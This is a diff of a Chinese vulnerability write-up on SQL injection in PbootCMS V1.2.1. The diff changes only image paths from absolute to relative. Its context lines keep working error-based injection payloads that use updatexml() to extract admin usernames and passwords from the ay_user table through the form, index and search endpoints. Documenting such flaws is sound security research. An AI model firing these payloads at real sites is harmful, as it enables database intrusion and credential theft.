@@ -11,7 +11,7 @@ PbootCMS sql注入
 
 注：我本地测试的所以我把验证验证码那一步关闭了=-=，实战中请自己加上验证码
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId24.png)
+![](./.resource/PbootCMSsql注入/media/rId24.png)
 
     url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Message/add
     post:
@@ -19,7 +19,7 @@ PbootCMS sql注入
         content = 1111
         mobile = 1111
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId25.png)
+![](./.resource/PbootCMSsql注入/media/rId25.png)
 
 ### 0x01.1.2 漏洞解读
 
@@ -120,23 +120,23 @@ POST 内容，只匹配数据库的字段，相同才会拼接到 \$\_data数组
 注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可
 进入后台
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId28.png)
+![](./.resource/PbootCMSsql注入/media/rId28.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId29.png)
+![](./.resource/PbootCMSsql注入/media/rId29.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId30.png)
+![](./.resource/PbootCMSsql注入/media/rId30.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId31.png)
+![](./.resource/PbootCMSsql注入/media/rId31.png)
 
 ### 0x08.2.1 漏洞演示
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId33.png)
+![](./.resource/PbootCMSsql注入/media/rId33.png)
 
     url：http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Form/add?fcode=2
     post：
       tel[tel`) VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId34.png)
+![](./.resource/PbootCMSsql注入/media/rId34.png)
 
 ### 0x08.2.2 漏洞解读
 
@@ -239,7 +239,7 @@ POST 内容，只匹配数据库的字段，相同才会拼接到 \$\_data数组
 
     http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId37.png)
+![](./.resource/PbootCMSsql注入/media/rId37.png)
 
 ### 0x01.3.2 漏洞解读
 
@@ -305,7 +305,7 @@ POST 内容，只匹配数据库的字段，相同才会拼接到 \$\_data数组
 
     url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId41.png)
+![](./.resource/PbootCMSsql注入/media/rId41.png)
 
 ### 0x08.4.2 漏洞讲解
 
@@ -357,7 +357,7 @@ api模块的注入需要后端开启api功能，并且获得 api\_appid 与 api\
 才能注入。 或是说 开启了api功能并且关闭了API强制认证 这样也可以注入
 所以较鸡助
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId44.jpg)
+![](./.resource/PbootCMSsql注入/media/rId44.jpg)
 
 0x10.1 接口注入一
 -----------------
@@ -419,7 +419,7 @@ function getList(
         mobile = 111
         content = 111
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId50.png)
+![](./.resource/PbootCMSsql注入/media/rId50.png)
 
 0x10.2.2 漏洞讲解
 文件：PbootCMS-V1.2.1\\apps\\api\\controller\\CmsController.php
@@ -504,7 +504,7 @@ POST 内容，只匹配数据库的字段，相同才会拼接到 \$\_data数组
         mobile = 111
         content = 123
 
-![](/Users/aresx/Documents/VulWiki/.resource/PbootCMSsql注入/media/rId53.png)
+![](./.resource/PbootCMSsql注入/media/rId53.png)
 
 0x10.3.2 漏洞讲解
 
